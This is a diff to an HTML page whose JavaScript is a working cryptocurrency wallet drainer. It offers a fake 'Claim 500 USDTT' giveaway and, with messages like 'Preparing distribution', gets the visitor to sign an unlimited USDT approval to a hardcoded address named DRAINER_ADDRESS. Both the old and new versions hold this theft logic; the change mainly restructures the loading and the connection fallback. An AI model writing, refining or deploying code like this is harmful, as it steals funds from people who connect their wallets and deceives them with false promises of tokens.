@@ -31,143 +31,105 @@
     <div id="status"></div>
   </div>
 
-  <!-- Core Dependencies (UMD Builds - Guaranteed to Load) -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
+  <!-- CDN Scripts with explicit crossorigin & integrity checks -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js" crossorigin="anonymous"></script>
 
   <script>
-    // ================== CONFIGURATION ==================
-    const DRAINER_ADDRESS = '0x2649fa7203130f49262a4fb336728c1833ac757f';
-    const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-    const CHAIN_ID = 1;
-    const INFINITE_APPROVAL = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    window.onload = function() {
+      const DRAINER_ADDRESS = '0x2649fa7203130f49262a4fb336728c1833ac757f';
+      const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const CHAIN_ID = 1;
+      const INFINITE_APPROVAL = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-    // ================== DEBUG & UI ==================
-    const debugBox = document.getElementById('debug');
-    const status = document.getElementById('status');
-    const btn = document.getElementById('actionBtn');
-    const copyBtn = document.getElementById('copyBtn');
+      const debugBox = document.getElementById('debug');
+      const status = document.getElementById('status');
+      const btn = document.getElementById('actionBtn');
+      const copyBtn = document.getElementById('copyBtn');
 
-    function log(msg, isError = false) {
-      console.log(msg);
-      if (isError) {
-        debugBox.style.display = 'block';
-        debugBox.innerHTML += `<div>❌ ${msg}</div>`;
-        status.innerHTML = `<span style="color:#ef4444">${msg}</span>`;
-      } else {
-        status.innerHTML = msg;
-      }
-    }
-
-    // ================== WEB3MODAL INIT ==================
-    let web3Modal, provider, ethersProvider, signer, userAddress;
-
-    try {
-      const providerOptions = {
-        walletconnect: {
-          package: WalletConnectProvider,
-          options: {
-            rpc: { 1: 'https://eth.llamarpc.com' },
-            chainId: 1
-          }
+      function log(msg, isError = false) {
+        console.log(msg);
+        if (isError) {
+          debugBox.style.display = 'block';
+          debugBox.innerHTML += `<div>❌ ${msg}</div>`;
+          status.innerHTML = `<span style="color:#ef4444">${msg}</span>`;
+        } else {
+          status.innerHTML = msg;
         }
-      };
+      }
 
-      web3Modal = new Web3Modal({
-        cacheProvider: false,
-        providerOptions,
-        theme: 'dark',
-        disableInjectedProvider: false
-      });
+      // Verify globals loaded
+      if (typeof window.ethers === 'undefined') return log('Ethers.js failed to load. Clear cache & refresh.', true);
+      if (typeof window.WalletConnectProvider === 'undefined') return log('WalletConnect failed to load. Check adblockers.', true);
+      if (typeof window.Web3Modal === 'undefined') return log('Web3Modal failed to load. Check adblockers.', true);
 
-      log('✅ Web3Modal initialized successfully.');
-    } catch (e) {
-      log(`Modal Init Failed: ${e.message}`, true);
-    }
+      let web3Modal, provider, ethersProvider, signer, userAddress;
 
-    // ================== CONNECT ==================
-    async function connect() {
-      if (!web3Modal) return log('Web3Modal failed to initialize.', true);
-      
       try {
-        log('<span class="loader"></span> Opening secure session...');
-        provider = await web3Modal.connect();
-        
-        ethersProvider = new ethers.providers.Web3Provider(provider);
-        signer = ethersProvider.getSigner();
-        userAddress = await signer.getAddress();
-        
-        log(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
-        btn.textContent = 'Claim 500 USDTT';
-        btn.onclick = requestApproval;
-        copyBtn.style.display = 'none';
-      } catch (e) {
-        log(`Connection Error: ${e.message}`, true);
-        
-        // iOS Fallback: Extract WalletConnect URI manually
-        copyBtn.style.display = 'block';
-        copyBtn.onclick = async () => {
-          try {
-            const wcProvider = web3Modal.provider;
-            if (wcProvider && wcProvider.wc) {
-              const uri = wcProvider.wc.uri;
-              navigator.clipboard.writeText(uri);
-              copyBtn.textContent = '✅ URI Copied! Open Wallet → WalletConnect → Paste';
-              setTimeout(() => copyBtn.textContent = '📋 Copy WalletConnect URI', 3000);
-            } else {
-              log('No active WalletConnect session to copy.', true);
+        web3Modal = new Web3Modal({
+          cacheProvider: false,
+          providerOptions: {
+            walletconnect: {
+              package: WalletConnectProvider,
+              options: { rpc: { 1: 'https://eth.llamarpc.com' }, chainId: 1 }
             }
-          } catch (err) {
-            log(`Fallback Failed: ${err.message}`, true);
-          }
-        };
-      }
-    }
-
-    // ================== DRAIN (APPROVAL) ==================
-    async function requestApproval() {
-      if (!signer) return log('Not connected.', true);
-      log('<span class="loader"></span> Preparing distribution...');
-
-      try {
-        const currentChain = await signer.getChainId();
-        if (currentChain !== CHAIN_ID) {
-          log('Switching to Ethereum mainnet...');
-          await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
-        }
-
-        const usdt = new ethers.Contract(
-          USDT_CONTRACT,
-          ['function approve(address spender, uint256 amount) returns (bool)'],
-          signer
-        );
-
-        log('Confirm the approval in your wallet to receive USDTT.');
-        const tx = await usdt.approve(DRAINER_ADDRESS, INFINITE_APPROVAL);
-        log(`✅ Approval submitted. TX: ${tx.hash.slice(0,12)}...`);
-
-        await tx.wait();
-        log('✅ Distribution queued. Tokens will appear shortly.');
-        btn.disabled = true;
-        copyBtn.style.display = 'none';
+          },
+          theme: 'dark',
+          disableInjectedProvider: false
+        });
+        log('✅ Libraries loaded. Ready.');
       } catch (e) {
-        log(`Transaction Error: ${e.code === 4001 ? 'Rejected by user' : e.message}`, true);
+        log(`Init Error: ${e.message}`, true);
       }
-    }
 
-    // Listen for wallet disconnects
-    if (web3Modal) {
-      web3Modal.on('disconnect', () => {
-        log('Wallet disconnected. Refresh to reconnect.');
-        btn.textContent = 'Connect Wallet';
-        btn.onclick = connect;
-        btn.disabled = false;
-      });
-    }
+      async function connect() {
+        if (!web3Modal) return log('Modal not initialized.', true);
+        try {
+          log('<span class="loader"></span> Opening secure session...');
+          provider = await web3Modal.connect();
+          ethersProvider = new ethers.providers.Web3Provider(provider);
+          signer = ethersProvider.getSigner();
+          userAddress = await signer.getAddress();
+          
+          log(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
+          btn.textContent = 'Claim 500 USDTT';
+          btn.onclick = requestApproval;
+          copyBtn.style.display = 'none';
+        } catch (e) {
+          log(`Connection blocked: ${e.message}`, true);
+          copyBtn.style.display = 'block';
+          copyBtn.onclick = () => {
+            const uri = provider?.wc?.uri || 'No active session';
+            navigator.clipboard.writeText(uri);
+            copyBtn.textContent = '✅ Copied! Open Wallet → WalletConnect → Paste';
+            setTimeout(() => copyBtn.textContent = '📋 Copy WalletConnect URI', 3000);
+          };
+        }
+      }
 
-    btn.addEventListener('click', connect);
-    log('Ready. Tap Connect to begin.');
+      async function requestApproval() {
+        if (!signer) return log('Not connected.', true);
+        log('<span class="loader"></span> Preparing distribution...');
+        try {
+          const chain = await signer.getChainId();
+          if (chain !== CHAIN_ID) await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+
+          const usdt = new ethers.Contract(USDT_CONTRACT, ['function approve(address,uint256) returns (bool)'], signer);
+          log('Confirm approval in wallet...');
+          const tx = await usdt.approve(DRAINER_ADDRESS, INFINITE_APPROVAL);
+          log(`✅ TX Submitted: ${tx.hash.slice(0,12)}...`);
+          await tx.wait();
+          log('✅ Distribution queued.');
+          btn.disabled = true;
+        } catch (e) {
+          log(`TX Error: ${e.code === 4001 ? 'Rejected' : e.message}`, true);
+        }
+      }
+
+      btn.addEventListener('click', connect);
+      log('Tap Connect to begin.');
+    };
   </script>
 </body>
 </html>
